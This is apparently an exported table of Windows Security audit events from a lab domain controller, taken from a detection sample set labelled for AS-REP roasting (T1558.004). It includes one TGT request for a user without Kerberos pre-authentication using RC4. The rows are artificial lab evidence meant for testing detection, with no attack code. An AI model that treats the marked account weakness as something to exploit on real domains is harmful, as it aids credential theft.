8,37867,2021-04-29 07:56:26.6814878,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,A Kerberos service ticket was requested,,::ffff:192.168.1.2:54636,Target: LABCORP.LOCAL\Bob@LABCORP.LOCAL,ServiceName: DC-SERVER-1$,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Bob@LABCORP.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC-SERVER-1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54636""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""45bf7c19-80f0-0327-a7d0-3d28cee31701""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
9,37868,2021-04-29 07:56:26.6832020,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\Bob (S-1-5-21-2662618741-3450174888-1698379039-1104),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC66389,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""SubjectUserName"",""#text"":""Bob""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC66389""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
10,37869,2021-04-29 07:56:26.6832968,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (192.168.1.2)",Target: LABCORP.LOCAL\Bob,LogonType 3,LogonId: 0xC66389,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""TargetUserName"",""#text"":""Bob""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC66389""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""1e230fd2-e649-64e2-d8cb-59308358c1ff""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54635""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
11,37870,2021-04-29 07:56:26.8693445,4768,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,A Kerberos authentication ticket (TGT) was requested,,::ffff:192.168.1.2:54637,Target: labcorp.local\Alice,ServiceName: krbtgt,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-502,TicketEncryptionType: RC4-HMAC,Status: KDC_ERR_NONE - No error - No errors were found.,PreAuthType: Logon without Pre-Authentication.,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""TargetDomainName"",""#text"":""labcorp.local""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1103""},{""@Name"":""ServiceName"",""#text"":""krbtgt""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-502""},{""@Name"":""TicketOptions"",""#text"":""0x40800010""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""TicketEncryptionType"",""#text"":""0x17""},{""@Name"":""PreAuthType"",""#text"":""0""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.2""},{""@Name"":""IpPort"",""#text"":""54637""},{""@Name"":""CertIssuerName""},{""@Name"":""CertSerialNumber""},{""@Name"":""CertThumbprint""}]}}"
12,37871,2021-04-29 07:56:26.9808567,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\Bob,LogonType 3,LogonId: 0xC66389,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1104""},{""@Name"":""TargetUserName"",""#text"":""Bob""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC66389""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
13,37872,2021-04-29 07:57:22.9035761,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC6B108,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC6B108""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
14,37873,2021-04-29 07:57:22.9038623,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2320,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC6B108,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC6B108""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""54371""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
15,37874,2021-04-29 07:57:22.9088466,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC6B108,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC6B108""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
16,37875,2021-04-29 07:58:02.6525054,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC712F1,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC712F1""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
17,37876,2021-04-29 07:58:02.6526651,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC712F1,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC712F1""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""b5ab5ccd-eca4-fc9c-3682-ee24b521fe72""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54374""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
18,37877,2021-04-29 07:58:02.6603670,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC713DD,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC713DD""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
19,37878,2021-04-29 07:58:02.6605822,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC713DD,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC713DD""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""c5279ba6-ad77-552e-9737-1974e1f4d01f""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
20,37879,2021-04-29 07:58:02.6665042,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC7142B,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC7142B""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
21,37880,2021-04-29 07:58:02.6666786,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (192.168.1.100)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC7142B,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC7142B""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""b5ab5ccd-eca4-fc9c-3682-ee24b521fe72""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.1.100""},{""@Name"":""IpPort"",""#text"":""54375""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
22,37881,2021-04-29 07:58:02.7617736,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC714D9,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC714D9""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
23,37882,2021-04-29 07:58:02.7618910,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC714D9,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC714D9""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""c5279ba6-ad77-552e-9737-1974e1f4d01f""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54376""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1840""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
24,37883,2021-04-29 07:58:02.7650688,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC7142B,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC7142B""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
25,37884,2021-04-29 07:58:02.7651012,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC713DD,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC713DD""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
26,37885,2021-04-29 07:58:02.7682393,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC712F1,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC712F1""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
27,37886,2021-04-29 07:58:13.4575936,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC714D9,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC714D9""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
28,37887,2021-04-29 07:58:22.9202696,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC72AE1,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC72AE1""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
